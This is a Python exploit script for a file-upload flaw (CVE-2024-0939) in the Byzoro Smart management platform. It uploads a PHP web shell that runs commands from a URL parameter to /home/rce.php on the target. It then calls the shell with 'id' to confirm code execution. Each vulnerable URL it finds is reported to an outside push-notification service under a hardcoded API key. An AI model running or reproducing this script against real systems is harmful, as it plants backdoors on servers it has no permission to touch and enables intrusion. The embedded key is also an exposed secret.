# Byzoro_Smart_Management_upload_scan.py

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request

def sc_send(text, desp='', key='[SENDKEY]'):
    postdata = urllib.parse.urlencode({'text': text, 'desp': desp}).encode('utf-8')
    urlserver = f'https://sctapi.ftqq.com/{key}.send'
    req = urllib.request.Request(urlserver, data=postdata, method='POST')
    with urllib.request.urlopen(req) as response:
        result = response.read().decode('utf-8')
    return result
key = "SCT202695TeKe1ATgRMke7f7jyrOOkH9GX"

def scan_Byzoro_Smart_Management_upload(url, proxies, headers, append_to_output):

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    if url.endswith("/"):
        path = "Tool/uploadfile.php?"
    else:
        path = "/Tool/uploadfile.php?"

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------13979701222747646634037182887",
        "Upgrade-Insecure-Requests": "1",
        "Connection":"close",
    }

    encodetext = url + path
    data='''-----------------------------13979701222747646634037182887\r\nContent-Disposition: form-data; name="file_upload"; filename="1.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET["c"]);?>\r\n-----------------------------13979701222747646634037182887\r\nContent-Disposition: form-data; name="txt_path"\r\n\r\n/home/rce.php\r\n-----------------------------13979701222747646634037182887--'''
    append_to_output("===================================================================", "green")
    append_to_output(f"扫描目标: {url}", "yellow")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req1 = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=20, proxies=proxies)

        if req1.status_code == 200 and '上传成功' in req1.text:
            append_to_output(f"[+] {url} 存在百卓Smart管理平台uploadfile.php文件上传漏洞(CVE-2024-0939)！！！！", "red")
            ret = sc_send('百卓Smart管理平台uploadfile.php文件上传漏洞(CVE-2024-0939)', f"漏洞连接: {url}\r\n漏洞类型: 文件上传", key)
            if url.endswith("/"):
                pathG = "home/rce.php?c=id"
            else:
                pathG = "/home/rce.php?c=id"

            if not url.startswith('http://') and not url.startswith('https://'):
                url = 'http://' + url

            encodetextG = url + pathG
            try:
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                req2 = requests.get(encodetextG, headers=headers, verify=False, timeout=20, proxies=proxies)
                if req2.status_code == 200 and 'uid' in req2.text:
                    append_to_output(f"[+] {url} 验证了百卓Smart管理平台uploadfile.php文件上传漏洞(CVE-2024-0939)！！！！", "red")
                else:
                    append_to_output(f"[-] {url} 验证在百卓Smart管理平台uploadfile.php文件上传漏洞(CVE-2024-0939)无漏洞", "green")
            except Timeout:
                append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
            except Exception as e:
                if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                    append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                else:
                    append_to_output(str(e), "yellow")
        else:
            append_to_output(f"[-] {url} 不存在百卓Smart管理平台uploadfile.php文件上传漏洞(CVE-2024-0939)", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
